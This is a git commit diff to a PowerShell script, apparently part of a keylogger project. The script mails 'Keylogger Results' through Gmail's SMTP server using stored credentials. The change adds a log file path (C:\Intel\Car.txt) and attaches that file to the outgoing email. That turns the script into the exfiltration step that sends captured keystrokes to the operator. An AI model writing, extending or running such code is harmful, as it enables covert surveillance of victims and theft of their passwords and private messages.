2dbff08d277623454e7bfc3c74509c9983bcbc27
TestMadman <59333688+TestMadman@users.noreply.github.com>
2020-01-05 01:59:53 +0100

    Update Zwei.ps1

--- Zwei.ps1
+++ Zwei.ps1
@@ -6,7 +6,7 @@ $body = "Keylogger Results"
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
+$Path="C:\Intel\Car.txt"
 
-
-send-mailmessage -from $from -to $to -subject $Subject -body $body -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
+send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
 
